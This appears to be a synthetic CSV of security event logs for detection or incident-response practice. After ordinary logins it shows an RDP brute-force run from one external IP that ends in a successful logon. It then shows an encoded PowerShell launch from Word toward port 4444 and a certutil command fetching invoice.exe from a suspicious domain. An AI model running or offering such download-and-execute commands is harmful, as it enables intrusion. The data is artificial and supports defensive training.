_time,src_ip,dst_ip,user,action,EventCode,dest_port,ParentImage,Image,CommandLine,bytes_out,hash,url
2024-03-15 08:06:08,10.0.0.26,151.101.1.140,a.jones,ALLOWED,4624,53,,,,,https://cloudflare.com/
2024-03-15 08:06:47,10.0.0.26,140.82.121.4,s.lee,ALLOWED,4624,53,,,,,https://office.com/
2024-03-15 08:07:15,10.0.0.24,151.101.1.140,d.brown,ALLOWED,4624,80,,,,,https://google.com/
2024-03-15 08:07:23,10.0.0.17,151.101.1.140,k.wilson,ALLOWED,4624,443,,,,,https://linkedin.com/
2024-03-15 08:07:55,10.0.0.48,142.250.80.46,s.lee,ALLOWED,4624,80,,,,,https://cloudflare.com/
2024-03-15 08:08:29,10.0.0.43,104.16.249.249,d.brown,ALLOWED,4624,443,,,,,https://linkedin.com/
2024-03-15 08:08:41,10.0.0.53,140.82.121.4,m.garcia,ALLOWED,4624,53,,,,,https://microsoft.com/
2024-03-15 08:08:53,10.0.0.28,13.107.42.14,a.jones,ALLOWED,4624,80,,,,,https://google.com/
2024-03-15 08:09:14,10.0.0.42,151.101.1.140,d.brown,ALLOWED,4624,443,,,,,https://linkedin.com/
2024-03-15 08:09:38,10.0.0.50,140.82.121.4,d.brown,ALLOWED,4624,443,,,,,https://github.com/
2024-03-15 08:10:06,10.0.0.58,151.101.1.140,d.brown,ALLOWED,4624,53,,,,,https://google.com/
2024-03-15 08:41:40,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:41:43,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:41:46,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:41:49,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:41:52,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:41:55,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:41:58,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:42:01,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:42:04,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:42:07,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:42:10,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:42:13,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:42:16,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:42:19,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:42:40,185.220.101.45,10.0.0.42,admin,ALLOWED,4624,3389,,,,,
2024-03-15 08:43:40,10.0.0.42,185.220.101.45,SYSTEM,ALLOWED,4688,4444,C:\Program Files\Microsoft Office\WINWORD.EXE,powershell.exe,powershell -enc JABIAE0A...,500,
2024-03-15 08:44:10,10.0.0.42,185.220.101.45,SYSTEM,ALLOWED,4688,443,explorer.exe,cmd.exe,cmd /c certutil -urlcache -f http://update-cdn-verify.xyz/invoice.exe,250000000,ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa
